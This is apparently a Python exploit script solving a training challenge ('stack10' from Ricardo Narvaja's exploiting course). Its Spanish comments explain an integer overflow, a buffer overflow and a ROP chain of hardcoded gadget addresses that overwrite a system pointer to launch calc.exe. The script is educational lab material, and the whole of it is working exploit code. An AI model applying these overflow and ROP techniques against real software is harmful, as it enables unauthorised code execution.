#Solucion reto stack10 by hdbreaker
#http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/013%20stack10.idb/

import os
import struct

#El programa lee fichero.dat
#Crea un buffer DstBuff
#Lee el primer caracter del fichero y se fija q coincida con 0x32 (var_C) #Integer overflow
byteZero = '\xFF' # Su binario comienza con 1
#var_8 pasa a tener la direccion de system y var_18 la de DstBuf, crea un size de 0x32 y llama a malloc
#Luego llega al memcpy leyendo FF bytes del fichero
buf = "calc.exe  "+'A' * 46 #Buffer Overflow

################ Rop Chain para sobre escribir pSystem de forma exitosa ######################
#1 gadgets para colocarme lo suficientemente cerca de pSystem para lograr sobrescribirlo
rop1 = struct.pack("<I", 0x1010194b) * 7 # pop edi # pop esi # pop ebx # retn
#2 gadget necesario para sacar del stack los registros entre nosotros y nuestro puntero a system
rop2 = struct.pack("<I", 0x1010146e) # pop esi; ret
#3 gadget para colocar el puntero a system (que apunta al kernel system) dentro de esi y acortar la distancia a pSystem
rop3 = struct.pack("<I", 0x10101438) # pop esi; pop ebp; ret
#3 Poner puntero a system en el stack
system = struct.pack("<I", 0x1010208C) # => a colocar en esi
#4 Coloco basura para pararme en la base de pSystem y pisarlo el siguiente gadget
junk = "AAAA"
#5 coloco el puntero a kernel system en esi y lo llamo (el puntero que esta dentro del puntero 0x1010208C que lo pusimos antes en esi)
# mov esi, [esi] es para lograr sacar el puntero real de kernel system que esta dentro system que lo alojamos anteriormente en esi
# Estas instrucciones:
#       mov ecx, esi; call j____guard_check_icall_fptr;
# Son solo basura q no afecta a nuestro flujo, nosotros solo necesitamos de
# 			mov esi, [esi] y del ultimo call: call esi
# para realizar la llamada indirecta a kernel system
call = struct.pack("<I", 0x10101328) #mov esi, [esi]; mov ecx, esi; call j____guard_check_icall_fptr; call esi
# No es necesario pasar el puntero a calc, ya que justo debajo de pSystem (el cual sobre escribimos en el stack) ya se encuentra un puntero a calc
# Justo en la direccion del stack: 0012FF38 => si lo vemos en hexdump apunta al dword "calc.exe  "  
ropChain = rop1 + rop2 + rop3 + system + junk + call
##############################################################################################

#Recta final creo el fichero 
payload = byteZero + buf + ropChain
f = open("fichero.dat", "w")
f.write(payload)
f.close()

print "[#] Sending Payload"
os.system("stack10.exe")

